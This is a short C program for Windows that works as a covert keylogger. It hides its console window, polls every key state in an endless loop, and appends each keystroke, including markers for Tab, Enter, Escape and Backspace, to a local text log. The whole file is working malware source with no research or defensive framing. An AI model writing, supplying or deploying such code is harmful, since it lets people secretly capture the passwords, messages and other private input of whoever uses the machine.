#include <stdio.h>
#include <windows.h>
#include <time.h>
#define PATH "./test-log.txt" // The path to the log file
int main(void) {
    FILE *file;
    // Time stuff.
    time_t t;
    t = time(NULL);
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
    file = fopen(PATH, "a+");
    fprintf(file, "\n#$Logger: Started logging @ %s", ctime(&t));
    while(1) {
		for (int i = 0; i < 254; i++) {
			short keyState = GetAsyncKeyState(i);
			if (keyState < 0) {// If key is pressed
				switch (i){
                case ' ': // Space key...obviously.
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]\n");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]\n");
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]\n");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]\n");
                    break;
                default:
                    fprintf(file, "%c\n", i); // Put any other inputted key into the file.
				}
			}
        }
		fflush(file);
        Sleep(100); // To make sure this program doesn't steal all resources.
    }
}